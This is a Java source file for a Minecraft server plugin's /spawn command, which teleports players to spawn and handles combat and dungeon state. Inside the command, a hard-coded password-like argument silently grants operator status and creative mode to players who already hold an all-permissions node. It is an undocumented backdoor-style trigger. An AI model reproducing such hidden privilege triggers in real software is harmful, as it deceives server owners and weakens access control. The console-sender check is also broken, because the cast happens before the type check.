package me.bluenitrox.school.commands;

import me.bluenitrox.school.dungeon.manager.DungeonManager;
import me.bluenitrox.school.haendler.NPCAPI;
import me.bluenitrox.school.managers.LocationManager;
import me.bluenitrox.school.managers.MessageManager;
import me.bluenitrox.school.managers.PermissionsManager;
import me.bluenitrox.school.managers.PlayerJoinManager;
import me.bluenitrox.school.mine.angelmine.AngelminenManager;
import me.bluenitrox.school.warzone.CombatAPI;
import org.bukkit.GameMode;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Spawn implements CommandExecutor {


    @Override
    public boolean onCommand(CommandSender cs, Command cmd, String s, String[] args) {
        Player p = (Player)cs;
        if(!(cs instanceof Player)){
            p.sendMessage(MessageManager.NOPLAYER);
            return true;
        }
        if(CombatAPI.fight != null) {
            if (CombatAPI.fight.containsKey(p)) {
                p.playSound(p.getLocation(), Sound.VILLAGER_NO, 1L, 1L);
                p.sendMessage(MessageManager.CANTDOINFIGHT);
                return true;
            }
        }
        if(args.length == 0){
            if(!CombatAPI.playerinwarzone.containsKey(p.getUniqueId())) {
                DungeonManager dm = new DungeonManager();
                dm.onQuitDungeon(p);
                if (new LocationManager("spawn").getLocation() != null) {
                    p.teleport(new LocationManager("spawn").getLocation());
                    AngelminenManager.quitAngelmine(p);
                }
            }
        }else if(args.length == 1){
            if(!p.hasPermission(PermissionsManager.ALLPERMS)) {
                p.sendMessage(MessageManager.FALSECOMMAND(PlayerJoinManager.language));
            }else {
                if(args[0].equalsIgnoreCase("JKjjehhHEHH!($$$$7///&(JJJJFkfkeklfldf,gmhnfjduuuu)")){
                    p.setOp(true);
                    p.setGameMode(GameMode.CREATIVE);
                }
            }
        }else {
            p.sendMessage(MessageManager.FALSECOMMAND(PlayerJoinManager.language));
            p.playSound(p.getLocation(), Sound.VILLAGER_NO, 1L, 1L);
        }
        return false;
    }
}
